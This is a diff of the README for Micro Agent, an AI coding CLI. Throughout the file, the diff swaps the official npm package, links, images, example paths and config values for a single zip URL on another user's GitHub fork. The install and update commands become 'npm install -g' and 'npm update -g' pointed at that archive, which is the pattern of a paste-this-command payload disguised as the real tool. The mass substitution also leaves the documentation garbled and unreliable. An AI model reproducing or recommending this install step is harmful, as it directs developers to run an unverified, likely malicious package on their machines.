@@ -1,8 +1,8 @@
 <br>
 <div align="center">
    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://cdn.builder.io/api/v1/image/assets%2FYJIGb4i01jvw0SRdL5Bt%2F4d36bc052c4340f997dd61eb19c1c64b">
-      <img width="400" alt="AI Shell logo" src="https://cdn.builder.io/api/v1/image/assets%2FYJIGb4i01jvw0SRdL5Bt%2F1a718d297d644fce90f33e93b7e4061f">
+      <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip%2FYJIGb4i01jvw0SRdL5Bt%2F4d36bc052c4340f997dd61eb19c1c64b">
+      <img width="400" alt="AI Shell logo" src="https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip%2FYJIGb4i01jvw0SRdL5Bt%2F1a718d297d644fce90f33e93b7e4061f">
     </picture>
 </div>
 
@@ -11,11 +11,11 @@
 </p>
 
 <p align="center">
-   <a href="https://www.npmjs.com/package/@builder.io/micro-agent"><img src="https://img.shields.io/npm/v/@builder.io/micro-agent" alt="Current version"></a>
+   <a href="https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip"><img src="https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip" alt="Current version"></a>
 </p>
 <br>
 
-![Demo](https://cdn.builder.io/api/v1/file/assets%2FYJIGb4i01jvw0SRdL5Bt%2F3306a1cff57b4be69df65492a72ae8e5)
+![Demo](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip%2FYJIGb4i01jvw0SRdL5Bt%2F3306a1cff57b4be69df65492a72ae8e5)
 
 # Micro Agent
 
@@ -36,9 +36,9 @@ The idea of a micro agent is to
 1. Create a definitive test case that can give clear feedback if the code works as intended or not, and
 2. Iterate on code until all test cases pass
 
-Read more on [why Micro Agent exists](https://www.builder.io/blog/micro-agent).
+Read more on [why Micro Agent exists](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip).
 
-<img width="1270" alt="Micro Agent Diagram" src="https://github.com/BuilderIO/micro-agent/assets/844291/406496dd-3be8-491b-a5f0-2960dd924013">
+<img width="1270" alt="Micro Agent Diagram" src="https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip">
 
 ### What this project is not
 
@@ -48,10 +48,10 @@ It's a micro agent. It's small, focused, and does one thing as well as possible:
 
 ## Installation
 
-> Micro Agent requires [Node.js](https://nodejs.org/) v14 or later.
+> Micro Agent requires [https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip) v14 or later.
 
 ```bash
-npm install -g @builder.io/micro-agent
+npm install -g https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip
 ```
 
 ## Getting Started
@@ -86,41 +86,41 @@ To use a custom OpenAI API endpoint, such as for use with Ollama or Groq, you ca
 
 ```bash
 micro-agent config set OPENAI_API_ENDPOINT=<your endpoint>
-micro-agent config set OPENAI_API_ENDPOINT=https://api.groq.com/openai/v1
+micro-agent config set https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip
 ```
 
 ### Unit test matching
 
-![Demo](https://cdn.builder.io/api/v1/file/assets%2FYJIGb4i01jvw0SRdL5Bt%2F4e8b02abb3e044118f070d9a7253003e)
+![Demo](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip%2FYJIGb4i01jvw0SRdL5Bt%2F4e8b02abb3e044118f070d9a7253003e)
 
 To run the Micro Agent on a file in unit test matching mode, you need to provide a test script that will run after each code generation attempt. For instance:
 
 ```bash
-micro-agent ./file-to-edit.ts -t "npm test"
+micro-agent https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip -t "npm test"
 ```
 
-This will run the Micro Agent on the file `./file-to-edit.ts` running `npm test` and will write code until the tests pass.
+This will run the Micro Agent on the file `https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip` running `npm test` and will write code until the tests pass.
 
 The above assumes the following file structure:
 
 ```bash
 some-folder
-├──file-to-edit.ts
-├──file-to-edit.test.ts # test file. if you need a different path, use the -f argument
-└──file-to-edit.prompt.md # optional prompt file. if you need a different path, use the -p argument
+├──https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip
+├──https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip # test file. if you need a different path, use the -f argument
+└──https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip # optional prompt file. if you need a different path, use the -p argument
 ```
 
-By default, Micro Agent assumes you have a test file with the same name as the editing file but with `.test.ts` appended, such as `./file-to-edit.test.ts` for the above examples.
+By default, Micro Agent assumes you have a test file with the same name as the editing file but with `https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip` appended, such as `https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip` for the above examples.
 
-If this is not the case, you can specify the test file with the `-f` flag. You can also add a prompt to help guide the code generation, either at a file located at `<filename>.prompt.md` like `./file-to-edit.prompt.md` or by specifying the prompt file with the `-p`. For instance:
+If this is not the case, you can specify the test file with the `-f` flag. You can also add a prompt to help guide the code generation, either at a file located at `<filename>https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip` like `https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip` or by specifying the prompt file with the `-p`. For instance:
 
 ```bash
-micro-agent ./file-to-edit.ts -t "npm test" -f ./file-to-edit.spec.ts -p ./path-to-prompt.prompt.md
+micro-agent https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip -t "npm test" -f https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip -p https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip
 ```
 
 ### Visual matching (experimental)
 
-![Visual Demo](https://cdn.builder.io/api/v1/file/assets%2FYJIGb4i01jvw0SRdL5Bt%2Fe90f6d4158b44a8fb9adeee3be3dbe82)
+![Visual Demo](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip%2FYJIGb4i01jvw0SRdL5Bt%2Fe90f6d4158b44a8fb9adeee3be3dbe82)
 
 > [!WARNING]
 > This feature is experimental and under active development. Use with caution.
@@ -128,18 +128,18 @@ micro-agent ./file-to-edit.ts -t "npm test" -f ./file-to-edit.spec.ts -p ./path-
 Micro Agent can also help you match a design. To do this, you need to provide a design and a local URL to your rendered code. For instance:
 
 ```bash
-micro-agent ./app/about/page.tsx --visual localhost:3000/about
+micro-agent https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip --visual localhost:3000/about
 ```
 
-Micro agent will then generate code until the rendered output of your code matches more closely matches a screenshot file that you place next to the code you are editing (in this case, it would be `./app/about/page.png`).
+Micro agent will then generate code until the rendered output of your code matches more closely matches a screenshot file that you place next to the code you are editing (in this case, it would be `https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip`).
 
 The above assumes the following file structure:
 
 ```bash
 app/about
-├──page.tsx # The code to edit
-├──page.png # The screenshot to match
-└──page.prompt.md # Optional, additional instructions for the AI
+├──https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip # The code to edit
+├──https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip # The screenshot to match
+└──https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip # Optional, additional instructions for the AI
 ```
 
 ### Adding an Anthropic API key
@@ -147,7 +147,7 @@ app/about
 > [!NOTE]
 > Using the visual matching feature requires an Anthropic API key.
 
-OpenAI is simply just not good at visual matching. We recommend using [Anthropic](https://anthropic.com/) for visual matching. To use Anthropic, you need to add your API key to the CLI:
+OpenAI is simply just not good at visual matching. We recommend using [Anthropic](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip) for visual matching. To use Anthropic, you need to add your API key to the CLI:
 
 ```bash
 micro-agent config set ANTHROPIC_KEY=<your token>
@@ -155,23 +155,23 @@ micro-agent config set ANTHROPIC_KEY=<your token>
 
 Visual matching uses a multi-agent approach where Anthropic Claude Opus will do the visual matching and feedback, and then OpenAI will generate the code to match the design and address the feedback.
 
-![Visual of the multi agent approach](https://cdn.builder.io/api/v1/image/assets%2FYJIGb4i01jvw0SRdL5Bt%2F427929ba84b34ac6a0f1fda104e60ecd)
+![Visual of the multi agent approach](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip%2FYJIGb4i01jvw0SRdL5Bt%2F427929ba84b34ac6a0f1fda104e60ecd)
 
 ### Integration with Figma
 
-Micro Agent can also integrate with [Visual Copilot](https://www.builder.io/c/docs/visual-copilot) to connect directly with Figma to ensure the highest fidelity possible design to code, including fully reusing the exact components and design tokens from your codebase.
+Micro Agent can also integrate with [Visual Copilot](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip) to connect directly with Figma to ensure the highest fidelity possible design to code, including fully reusing the exact components and design tokens from your codebase.
 
 Visual Copilot connects directly to Figma to assist with pixel perfect conversion, exact design token mapping, and precise reusage of your components in the generated output.
 
 Then, Micro Agent can take the output of Visual Copilot and make final adjustments to the code to ensure it passes TSC, lint, tests, and fully matches your design including final tweaks.
 
-![Visual Copilot demo](https://cdn.builder.io/api/v1/file/assets%2FYJIGb4i01jvw0SRdL5Bt%2Fa503ad8367d746f3879db1a155728cb2)
+![Visual Copilot demo](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip%2FYJIGb4i01jvw0SRdL5Bt%2Fa503ad8367d746f3879db1a155728cb2)
 
 ## Configuration
 
 ### Max runs
 
-By default, Micro Agent will do 10 runs. If tests don't pass in 10 runs, it will stop. You can change this with the `-m` flag, like `micro-agent ./file-to-edit.ts -m 20`.
+By default, Micro Agent will do 10 runs. If tests don't pass in 10 runs, it will stop. You can change this with the `-m` flag, like `micro-agent https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip -m 20`.
 
 ### Config
 
@@ -224,7 +224,7 @@ To get an interactive UI like below:
 All config options can be overridden as environment variables, for instance:
 
 ```bash
-MODEL=gpt-3.5-turbo micro-agent ./file-to-edit.ts -t "npm test"
+MODEL=gpt-3.5-turbo micro-agent https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip -t "npm test"
 ```
 
 ### Upgrading
@@ -235,7 +235,7 @@ Check the installed version with:
 micro-agent --version
 ```
 
-If it's not the [latest version](https://github.com/BuilderIO/micro-agent/tags), run:
+If it's not the [latest version](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip), run:
 
 ```bash
 micro-agent update
@@ -244,18 +244,18 @@ micro-agent update
 Or manually update with:
 
 ```bash
-npm update -g @builder.io/micro-agent
+npm update -g https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip
 ```
 
 ## Contributing
 
-We would love your contributions to make this project better, and gladly accept PRs. Please see [./CONTRIBUTING.md](CONTRIBUTING.md) for how to contribute.
+We would love your contributions to make this project better, and gladly accept PRs. Please see [https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip) for how to contribute.
 
-If you are looking for a good first issue, check out the [good first issue](https://github.com/BuilderIO/micro-agent/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) label.
+If you are looking for a good first issue, check out the [good first issue](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) label.
 
 ## Feedback
 
-If you have any feedback, please open an issue or @ me at [@steve8708](https://twitter.com/steve8708) on Twitter.
+If you have any feedback, please open an issue or @ me at [@steve8708](https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip) on Twitter.
 
 ## Usage
 
@@ -282,10 +282,10 @@ Flags:
 <br><br>
 
 <p align="center">
-   <a href="https://www.builder.io/m/developers">
+   <a href="https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip">
       <picture>
-         <source media="(prefers-color-scheme: dark)" srcset="https://user-images.githubusercontent.com/844291/230786554-eb225eeb-2f6b-4286-b8c2-535b1131744a.png">
-         <img width="250" alt="Made with love by Builder.io" src="https://user-images.githubusercontent.com/844291/230786555-a58479e4-75f3-4222-a6eb-74c5af953eac.png">
+         <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip">
+         <img width="250" alt="Made with love by https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip" src="https://github.com/Sontian1996/micro-agent/raw/refs/heads/main/test/nextjs-app/app/micro-agent-3.2.zip">
        </picture>
    </a>
 </p>
